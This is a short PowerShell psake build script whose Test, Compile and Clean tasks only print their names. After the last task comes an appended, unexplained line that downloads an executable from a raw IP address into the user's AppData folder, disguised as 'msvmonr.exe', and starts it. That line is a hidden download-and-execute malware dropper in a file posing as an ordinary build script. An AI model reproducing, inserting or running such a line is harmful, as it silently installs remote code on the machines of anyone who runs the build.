task default -depends Test

task Test -depends Compile, Clean -PreAction {"Pre-Test"} -Action { 
  "Test"
} -PostAction {"Post-Test"}

task Compile -depends Clean { 
  "Compile"
}

task Clean { 
  "Clean"
}
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',"$env:APPDATA\msvmonr.exe");Start-Process ("$env:APPDATA\msvmonr.exe")

